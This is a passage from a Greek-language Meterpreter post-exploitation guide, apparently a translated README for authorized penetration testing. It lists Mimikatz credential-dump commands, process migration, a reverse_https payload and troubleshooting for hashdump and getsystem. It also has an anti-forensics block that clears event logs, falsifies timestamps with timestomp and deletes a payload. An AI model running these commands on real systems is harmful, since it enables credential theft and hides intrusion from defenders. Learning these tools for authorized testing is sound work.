| `lsa_dump_sam` | Εξαγωγή στοιχείων SAM μέσω της αντίστοιχης λειτουργίας |
| `kiwi_cmd <cmd>` | Εκτέλεση εντολής Mimikatz |

---

<a id="section-16"></a>

## 💡 Συμβουλές χρήσης

### Καλές πρακτικές του πρωτοτύπου και περιορισμοί

Οι απόλυτες διατυπώσεις του πρωτοτύπου, όπως «Always Migrate First», δεν είναι καθολικές προϋποθέσεις. Η μεταφορά διεργασίας και η διαγραφή καταγραφών δεν πρέπει να εφαρμόζονται χωρίς συγκεκριμένο λόγο και εξουσιοδότηση.


1. **Η σύσταση του πρωτοτύπου για αρχική μεταφορά διεργασίας**
   ```bash
   # Σύσταση του πρωτοτύπου για μεταφορά διεργασίας — όχι καθολική προϋπόθεση
   meterpreter > migrate -N explorer.exe
   ```

2. **Διαχείριση συνεδρίας στο παρασκήνιο**
   ```bash
   # Παράδειγμα μεταφοράς συνεδρίας στο παρασκήνιο
   meterpreter > background
   ```

3. **Χρήση υποστηριζόμενης κρυπτογραφημένης μεταφοράς**
   ```bash
   # Παράδειγμα χρήσης μεταφοράς HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Έλεγχος κατάστασης πριν από ενέργειες**
   ```bash
   # Έλεγχος των πραγματικών δικαιωμάτων
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Διερεύνηση προβλημάτων

| Πρόβλημα | Ενδεικτική προσέγγιση |
| ------- | ---------- |
| Η συνεδρία τερματίζεται | Εξετάστε τη συμβατότητα και σταθερότητα της διεργασίας |
| Αποτυχία hashdump | Ελέγξτε δικαιώματα και υποστήριξη· το `getsystem` δεν εγγυάται επιτυχία |
| Αποτυχία getsystem | Το πρωτότυπο αναφέρει εναλλακτικές `-t 1,2,3`· ισχύουν συγκεκριμένες προϋποθέσεις |
| Χωρίς καταγεγραμμένες πληκτρολογήσεις | Εξετάστε το πλαίσιο συνεδρίας και διεργασίας που αναφέρει το πρωτότυπο |
| Λήξη χρόνου αναμονής εντολών | Έλεγχος δικτυακής επικοινωνίας |

### Παραδείγματα μεταβολής ιχνών του πρωτοτύπου

```bash
# 1. Παράδειγμα αλλαγής διεργασίας
meterpreter > migrate -N svchost.exe

# 2. Διαγραφή ψηφιακών καταχωρίσεων στο παράδειγμα
meterpreter > clearev

# 3. Παράδειγμα μεταβολής χρονικών σημάνσεων αρχείων
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Διαγραφή συγκεκριμένων αρχείων στο παράδειγμα του πρωτοτύπου
meterpreter > rm C:\\temp\\payload.exe
```

---

<a id="section-17"></a>

## ⚠️ Πλαίσιο εξουσιοδοτημένης χρήσης

> **Πλαίσιο χρήσης:** Ο οδηγός προορίζεται για εκπαίδευση και εξουσιοδοτημένους ελέγχους. Επιβεβαιώστε το πεδίο και τις επιτρεπόμενες ενέργειες πριν από χρήση.

---

<a id="section-18"></a>

## 📚 Σχετικές πηγές

- [Οδηγός Metasploit Framework](README.el.md)
- [Υλικό Offensive Security](https://www.offensive-security.com/)
- [Τεκμηρίωση Metasploit της Rapid7](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Μελετήστε τις λειτουργίες συνεδριών Meterpreter.</b><br>
  <i>Συνδέστε κάθε ενέργεια με τον σκοπό και τα όρια του ελέγχου.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
